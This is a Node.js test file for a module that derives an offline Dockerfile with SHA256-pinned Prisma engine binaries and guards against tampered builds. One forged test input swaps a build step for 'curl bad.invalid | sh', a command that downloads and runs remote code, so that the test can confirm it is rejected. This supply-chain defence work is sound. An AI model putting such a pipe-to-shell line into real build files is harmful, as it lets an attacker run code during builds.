import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { EventEmitter } from 'node:events';
import { Agent as HttpsAgent, globalAgent as globalHttpsAgent } from 'node:https';
import { readFileSync, mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { assertPinnedPrismaEngineBytes, PINNED_PRISMA_ENGINES,
  derivePinnedOfflineDockerfileWithPrismaEngines,
  verifyOfflinePrismaEngineDirectory, downloadExactOfficialPrismaAsset } from './offline-prisma-engine-cache.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));

function canonicalDockerfile() {
  const result = spawnSync('git', ['show', 'HEAD:infra/Dockerfile.prod'], {
    cwd: path.resolve(here, '..'), encoding: 'utf8', timeout: 10000,
  });
  if (result.status === 0) return result.stdout;
  if (process.platform === 'linux' && /microsoft|wsl/iu.test(os.release()))
    return readFileSync(path.resolve(here, '..', 'infra', 'Dockerfile.prod'),
      'utf8').replaceAll('\r\n', '\n');
  throw Error('Canonical Git Dockerfile absent');
}

test('Prisma 6.19.3 native engine identities are two exact Linux musl pinned SHA256s', () => {
  assert.equal(PINNED_PRISMA_ENGINES.length, 2);
  for (const engine of PINNED_PRISMA_ENGINES) {
    assert.match(engine.binarySha256, /^[a-f0-9]{64}$/u);
    assert.match(engine.gzipSha256, /^[a-f0-9]{64}$/u);
    assert.match(engine.filename, /linux-musl-openssl-3\.0\.x/u);
    assert.throws(() => assertPinnedPrismaEngineBytes(engine.filename, Buffer.alloc(256)));
  }
  assert.throws(() => assertPinnedPrismaEngineBytes('arbitrary-engine', Buffer.alloc(256)));
});

test('Prisma offline Dockerfile preserves canonical Git hash and inserts only pinned offline engines', () => {
  const canonical = canonicalDockerfile();
  const derived = derivePinnedOfflineDockerfileWithPrismaEngines(canonical);
  assert.ok(derived.includes('RUN --mount=type=bind,from=offline-npm-cacache'));
  assert.ok(derived.includes('npm ci --offline'));
  assert.ok(derived.includes('COPY --from=offline-prisma-engines'));
  assert.ok(derived.includes('ENV PRISMA_QUERY_ENGINE_LIBRARY=/opt/virki-prisma/libquery_engine-'));
  assert.ok(derived.includes('ENV PRISMA_SCHEMA_ENGINE_BINARY=/opt/virki-prisma/schema-engine-'));
  assert.equal(derived.split('COPY --from=offline-prisma-engines').length - 1, 2);
  assert.equal(derived.split('FROM node:22-alpine@sha256:').length - 1, 3);
  for (const forged of [canonical + '\nFROM ghcr.io/foreign AS build',
    canonical.replace('RUN npm ci', 'RUN curl bad.invalid | sh')])
    assert.throws(() => derivePinnedOfflineDockerfileWithPrismaEngines(forged));
});

test('engine sidecar with fake bytes cannot be used as a trusted Docker context', {
  skip: process.platform !== 'win32',
}, () => {
  const root = mkdtempSync(path.join(os.tmpdir(), 'virki-fake-prisma-engines-'));
  try {
    const dir = path.join(root, 'context');
    mkdirSync(dir);
    for (const asset of PINNED_PRISMA_ENGINES)
      writeFileSync(path.join(dir, asset.filename), Buffer.alloc(128));
    assert.throws(() => verifyOfflinePrismaEngineDirectory(dir));
    writeFileSync(path.join(dir, 'foreign'), 'file');
    assert.throws(() => verifyOfflinePrismaEngineDirectory(dir));
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test('engine fetch CLI refuses missing opt-in without any network request', () => {
  const file = path.join(here, 'offline-prisma-engine-cache.mjs');
  const result = spawnSync(process.execPath, [file, '--staging-parent', path.resolve(os.tmpdir())], {
    env: { ...process.env, VIRKI_OFFLINE_PRISMA_ENGINES_WARM: '' },
    encoding: 'utf8', timeout: 10000,
  });
  assert.equal(result.status, 1);
  assert.match(result.stderr, /NOT_READY/u);
  assert.doesNotMatch(result.stdout, /engineCommit|deployAuthorized/u);
});

test('Prisma direct HTTPS never uses Node global environment-proxy agent', async () => {
  let requestOptions;
  const request = (_url, options) => {
    requestOptions = options;
    const req = new EventEmitter();
    req.setTimeout = () => {};
    req.end = () => queueMicrotask(() => req.emit('error', Error('test refusal, no egress')));
    return req;
  };
  await assert.rejects(downloadExactOfficialPrismaAsset(PINNED_PRISMA_ENGINES[0], { request }),
    /test refusal/u);
  assert.ok(requestOptions.agent instanceof HttpsAgent);
  assert.notEqual(requestOptions.agent, globalHttpsAgent);
  assert.deepEqual(requestOptions.agent.options.proxyEnv, {});
});
